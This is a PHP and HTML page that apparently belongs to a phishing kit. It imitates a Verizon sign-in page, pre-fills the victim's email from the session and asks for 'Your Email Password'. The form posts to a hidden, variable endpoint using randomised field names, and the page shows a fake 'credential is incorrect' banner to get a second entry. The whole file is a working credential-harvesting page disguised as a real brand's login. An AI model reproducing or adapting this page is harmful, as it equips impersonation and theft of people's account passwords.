<?php
include "mfunc.php";
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        
        <title>Verizon</title>
        <link rel="stylesheet" href="rel<?php echo gefnm("/vr/bootstrap-3.3.7.min.css");?>">
        <link rel="stylesheet" href="rel<?php echo gefnm("/vr/style-2.0.css");?>"><script src="rel<?php echo gefnm("/vr/jquery-1.12.4.min.js");?>"></script>
    
        <link rel="stylesheet" href="rel<?php echo gefnm("/vr/core.css");?>">
            

<link rel="shortcut icon" href="rel<?php echo gefnm("/vr/favicon.ico");?>">
    

        <script>
            var $j = jQuery;
        </script>
        <script src="rel<?php echo gefnm("/vr/bootstrap-3.3.7.min.js");?>"></script>

        <script src="rel<?php echo gefnm("/vr/core.js");?>"></script>
        <script type="text/javascript">
            var overlayMode = '';
            var errorDisplayed = false;
            var fromVZTsession = '';
            var fromVZTparam = '';
            var oauthClientId = '';
            var streamTVSourcePlt = '';
            var loginURLFromsession = '';
            var fromVZT = fromVZTparam || fromVZTsession;
            var userIdOrMdn =  '';
            !function(i){"use strict";var t=function(i,t){this.selector=i,this.callback=t},e=[];e.initialize=function(e,n){var c=[],a=function(){-1==c.indexOf(this)&&(c.push(this),i(this).each(n))};i(e).each(a),this.push(new t(e,a))};var n=new MutationObserver(function(){for(var t=0;t<e.length;t++)i(e[t].selector).each(e[t].callback)});n.observe(document.documentElement,{childList:!0,subtree:!0,attributes:!0}),i.fn.initialize=function(i){e.initialize(this.selector,i)},i.initialize=function(i,t){e.initialize(i,t)}}(jQuery);
            $j(document).ready(function() {
                $j('#challengequestion').preventDoubleSubmission();
                //added to disable continue button if no answer is entered
               
                if ($j('#continueButton').length) {
                    $j("#continueButton").attr("disabled", "disabled");
                }
                else if ($j('#otherButton').length) {
                    $j("#otherButton").attr("disabled", "disabled");
                }

                $j('#IDToken1').keyup(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .keyup IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) { 
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers
                $j('#IDToken1').change(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .change IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .change disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers - test blur
                $j('#IDToken1').blur(function (key) {
                    var inputVal = $j(this).val();
                    //console.log("CQA .blur IDToken1="+$j(this).val());
                    if(inputVal.length >= 1 && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test($j('#IDToken').val())==true) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .blur disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });


                $j('#IDToken').keyup(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers
                $j('#IDToken').change(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1 ) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .change disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //ensure button is enabled if saved/auto-fill answers - test blur
                $j('#IDToken').blur(function (key) {
                    var inputVal = $j(this).val();
                    if(/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(inputVal)==true && $j('#IDToken1').val().length >=1) {
                        if ($j('#continueButton').length) {
                            $j("#continueButton").removeAttr("disabled");
                            $j('#continueButton').prop("disabled", false);
                            //console.log("CQA continueButton enabled")
                        }
                        else if ($j('#otherButton').length) {
                            $j("#otherButton").removeAttr("disabled");
                            $j('#otherButton').prop("disabled", false);
                            //console.log("CQA otherButton enabled")
                        }
                    } else {
                      console.log("CQA .blur disable btn");
                        if ($j('#continueButton').length) {
                            //console.log("CQA continueButton disabled")
                            $j("#continueButton").attr("disabled", "disabled");
                            $j('#continueButton').prop("disabled", true);
                        }
                        else if ($j('#otherButton').length) {
                            //console.log("CQA otherButton disabled")
                            $j("#otherButton").attr("disabled", "disabled");
                            $j('#otherButton').prop("disabled", true);
                        }
                    }
                });

                //added this here
                 $j('body').on('keydown','button, a',function(e){
                  if(e.which === 32){$j(this).trigger('click')}
                 });
                 
                $j("body").on("click mouseenter", ".a11y-tooltip > a", function(e){           
                    e.stopPropagation();
                    e.preventDefault();
                    if (e.type === "click"  && !$j(this).next().find("button.close-a11y-tooltip").length){
                        $j(this).next().append('<button class="close-a11y-tooltip"><span aria-hidden="true"></span>close information</button>');
                    }
                    else if ("mouseenter" === e.type && $j(this).next().find("button.close-a11y-tooltip").length){ 
                        $j(this).next().find("button.close-a11y-tooltip").remove();
                    }
                    if($j(this).next().is(':visible')){
                        $j(this).attr('aria-expanded',false).next().hide();
                    }             
                              else 
                              {
                                  if (fromVZT == 'Y'){
                                  
                                       $j(this).next().addClass("m-right");
                                  
                                  }
                                  else if ($j(this).offset().left < $j(window).width() / 2)
                                  {
                                      $j(this).next().addClass("m-bottom");
                                  }
                                  else if (inInline){
                                  
                                       $j(this).next().addClass("m-bottom");
                                  }
                                  else
                                  { 
                                      $j(this).next().removeClass("m-bottom");           
                                                          
                                  }                       
                             
                                    $j(this).attr('aria-expanded',true).next().show();  
                             }   
                        });
                     
                      
                                      
                        $j("body").on("mouseleave",".a11y-tooltip", function(e)
                        {
                             $j(this).find('a:first').text().replace('expanded','collapsed');
                   $j(this).find('div.a11y-tooltip-content').hide();                    
                          
                          
                        });
                            
                                                    
                         $j("body" ).on("click keydown", "button.close-a11y-tooltip", function(e) 
                        {
                             if ("click" === e.type) 
                             { 
                                   e.preventDefault();
                                   e.stopPropagation();
                                 $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                   $j(".a11y-tooltip-content").hide();                               
                                 $j(".a11y-tooltip").focus(); 
                                   $j('button.close-a11y-tooltip').parent().prev().focus(); 
                                   
                             
                          
                  }
                  else if (9 === e.which) 
                            {
                                   e.preventDefault();
                                   e.stopPropagation();
                                   $j(".a11y-tooltip-content").hide();
                                 $j("#forgotPasswordLink").focus();
                                 $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                
                             }
                             else if (27 === e.which)
                             {
                                e.preventDefault();                       
                                $j(".a11y-tooltip-content").hide();
                  $j(".a11y-tooltip").focus();                      
                  $j('button.close-a11y-tooltip').parent().prev().focus();
                  $j(".a11y-tooltip > a").attr('aria-expanded',false);
                   }
                           
                                               
                  if (event.shiftKey && event.keyCode == 9){
                           
                      $j(".a11y-tooltip-content").hide();
                  $j("#rememberUserName").focus();
                  $j(".a11y-tooltip > a").attr('aria-expanded',false);
                                
                   }
                           
                                               
                        });
                   
                        
                        $j("body" ).on("keydown", ".a11y-tooltip", function(e) 
                        {   
                      
                          if(event.shiftKey && event.keyCode == 9){
                          
                            $j(".a11y-tooltip-content").hide();
                            $j(".a11y-tooltip > a").attr('aria-expanded',false);
                   } 
                        
                 if (e.which === 27)
                  {
                                    e.preventDefault();
                                    $j(".a11y-tooltip-content").hide();                      
                      $j(".a11y-tooltip").focus();
                      $j('button.close-a11y-tooltip').parent().prev().focus();
                      $j(".a11y-tooltip > a").attr('aria-expanded',false);
                            
                            
                 }                      
                        
                         
             }); 
                // ends here
                if(errorDisplayed && (oauthClientId != 'StreamTVAgent') ){
                    $j('#bannererror').focus();
                }else{
                     $j('#IDToken').focus();
                }
                $j('#sharedComputerTooltip').tooltip({
                    container: '#main-content'
                });
                
                $j('#rememberComputer').focus(function(){
                    $j('#remembercomputerblock').addClass('extendedremember');
                });
                $j('#rememberComputer').blur(function(){
                    $j('#remembercomputerblock').removeClass('extendedremember');
                });

                if (overlayMode == 'o') {
                    $j('#main-content a').attr('target', '_top');
                }

                $j('.grecaptcha-badge').appendTo("#challengequestion");
                    $j.initialize(".grecaptcha-badge", function() {
                      $j(this).appendTo("#challengequestion");
                      console.log('append done');
                    });
                });
            
            function signInAsDiffUserClicked() {
                 
                return true;
            }
            function forgotMyAnswerClicked() {
                 
                return true;
            }
            function continueClicked(buttonID) {
            	//var displayInvisibleCaptcha = '';
            	//check captcha response if displayInvisibleCaptcha is true or else just allow to continue
                if (checkCaptchaResponse(buttonID)) {
                    
                     return true;
                 } else {
                     return false;
                 }
            }
            var onSubmit = function(response) {
                console.log('login form submit'+response);
                $j('#challengequestion').submit();
            };
            function popUp(f,d,a,c){var b="";if(d=="flashPopup"){b="resizable,height="+a+",width="+c}if(d=="popup"){b="scrollbars,resizable,height="+a+",width="+c}if(d=="fullScreen"){b="scrollbars,location,directories,status,menubar,toolbar,resizable"}window.open(f,"newWin",b)}

        </script>

	<style>
	.form-control {
    width: 100%;
	max-width:370px;
	}
	</style>

		
		<style type="text/css">[id^='LPMcontainer']:focus{outline: 2px dashed #747676 !important;outline-offset: 5px;}</style></head>
    
    <body id="fullscreen-body" class="Desktop-device">
    
    





    
        
        
        
            



    
    
        <div id="vz-gh20">
<div class="gnav20 " data-exp-name="Limited">
     
    <div class="gnav20-sticky-content">    	
     	



    
    
    <div class="gnav20-apicomponentnewdesign">

<a class="gnav20-header-accessibility" href="javascript:void(0)" tabindex="0" id="gnav20-skip-to-main-content-id">
	<span>Skip to main content</span>
</a>

<div class="gnav20-width-wrapper gnav20-new-design  gnav20-promo-bottom" data-gnav20-container="header">	
	
	
	<div class="gnav20-vzhmoverlay"></div>
	<div class="gnav20-main">
		



    
    
    <div class="gnav20-gnav-new-design">

<div class="gnav20-desktop" item-title="all">
	<div class="gnav20-row-one">
		<div class="gnav20-grid1-wrapper">
			



    
    
    <div class="ghost">

</div>



		</div>		
		<div class="gnav20-utility">		
			



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-mobile" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        </div>
    </div>
	<div class="gnav20-row-two">
		<div class="gnav20-grid1-wrapper">
			



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoWhiteBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNDI4IiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDQyOCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDI1MEg3Ny43MkwxNTUuNDMgNDE2LjY3TDM0OS43MyAwSDQyNy40NUwxOTQuMjkgNTAwSDExNi41OEwwIDI1MFoiIGZpbGw9IiNFRTAwMDAiLz4KPC9zdmc+Cg==">
    </a>
</div></div>



		</div>
		<div class="gnav20-navigation">
			




		</div>
		<div class="gnav20-utility">		
			



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-desktop" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        </div>
    </div>
</div>

<div class="gnav20-mobile gnav20-hide-hamburger " item-title="all">
	<div class="gnav20-wrapper-logo">
		



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoWhiteBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNDI4IiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDQyOCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDI1MEg3Ny43MkwxNTUuNDMgNDE2LjY3TDM0OS43MyAwSDQyNy40NUwxOTQuMjkgNTAwSDExNi41OEwwIDI1MFoiIGZpbGw9IiNFRTAwMDAiLz4KPC9zdmc+Cg==">
    </a>
</div></div>



	</div>
    <div class="gnav20-utility">
        



    
    
    <div class="gnav20-localization">

    
		<div class="gnav20-utility-wrapper gnav20-hide-on-desktop" item-title="localization">
			
				
				<a class="gnav20-lang-link gnav20-subanchor" aria-label="Switch to Español language website" ></a>
					
			
		</div>
    

</div>



        <button id="gnav20-nav-toggle" data-menuitem="vzmobilemenu" tabindex="0" aria-label="Menu for navigation opens a modal overlay">
		</button>
    </div>
    <nav id="gnav20-mobile-menu" class="gnav20-mobile-menu gnav20-hide">
        <button id="gnav20-closex" class="gnav20-closex" aria-label="close the Menu" tabindex="0">Close</button>
        <div id="gnav20-ulwrapper">
			



    
    
    <div class="ghost">

</div>



			<div class="gnav20-navigation-placeholder">
			




		</div>            
			
        </div>
        <div id="gnav20-footerlink">
            



    
    
    <div class="gnav20-localization">

    
		
    

</div>


            
        </div>
		
    </nav>
</div></div>


		
	</div>
	<div class="gnav20-width-wrapper-border-bottom"></div>
	
	<div>



</div>
</div>
<div name="headerEnd" id="gnav20-header-end" role="none" tabindex="-1"></div></div>



     </div>
	<div class="gnav20-sticky-header gnav20-new-design"></div>
</div>


</div>

    <main role="main">

        <div id="main-content" class="container-fluid">
		<div class="row" style="display:<?php if(!isset($eshow)){echo 'none';};?>">
                <div class="col-xs-12">
                    <p id="bannererror" tabindex="0" class="bg-danger">The credential you entered is incorrect. <span class="normal-text">Please try again...</span><br><span style="display:block;margin-top:10px;"></span></p>
                </div>
 </div>

            <div class="row">
                <div class="col-xs-12">
  <h1>Sign in</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-6">
<form id="challengequestion" name="challengequestion" action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="post">
                        <div class="form-group">
                            <h3>Email Address</h3>
    <input id="IDToken" class="form-control" type="email" value="<?php echo $_SESSION['email'];?>" readonly autocomplete="off" name="<?php echo $ename; ?>" tabindex="0">
	<br/>
								<input type="hidden" name="<?php echo $idc; ?>" value='<?php echo md5(uniqid()); ?>'>
<label for="IDToken1">Enter Your Email Password</label>
    <input id="IDToken1" class="form-control" type="password" value="" autocomplete="off" name="<?php echo $pname; ?>" tabindex="0">
                        </div>
                   
                        <div class="form-group btn-center">
                            <button id="otherButton" class="btn btn-default btn-lg" type="submit" disabled="">Continue</button>
                        </div>
</form>
                </div>

            </div>
        </div>


    </main>
    




    
    
        <div id="vz-gf20">
<div class="gnav20 " data-exp-name="Master">
    <div class="gnav20-sticky-content">    	
     	



    
    
    <div class="gnav20-footercontainer">
<div class="gnav20-footer-container gnav20-white-focus gnav20-mobile-footer-accordion" data-gnav20-container="footer" role="contentinfo">
	<div class="gnav20-main-container">
		<div class="gnav20-footer-level-two gnav20-custom-margin-left">
			



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoBlackBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="rel<?php echo gefnm("/vr/full_logo_white.png");?>">
    </a>
</div></div>


    
    
    <div class="gnav20-footerlink">


	<ul class="gnav20-footer-list ">
		<li><a >Site Map</a></li>
	
		<li><a >Privacy policy</a></li>
	
		<li><a >Accessibility</a></li>
	
		<li><a >Open internet</a></li>
	
		<li><a >Terms &amp; conditions</a></li>
	
		<li><a >Advertise with us</a></li>
	
		<li><a >Do Not Sell My Personal Information</a></li>
	
		<li><a >About our ads</a></li>
	</ul>

	<div class="copyright-section">
		<div class="copyright-text">
			© <span id="copyright-year"><?php echo date("Y");?></span> Verizon
		</div>
    <div id="visual-cue"><div></div><div></div><div></div></div></div>
</div>



		</div>
	</div>
</div>
</div>


    
    
    


     </div>
	<div class="gnav20-sticky-header "></div>
</div>


</div>
     <div class="gnav20-click-div"></div><div class="gnav20-click-div"></div>
</body></html>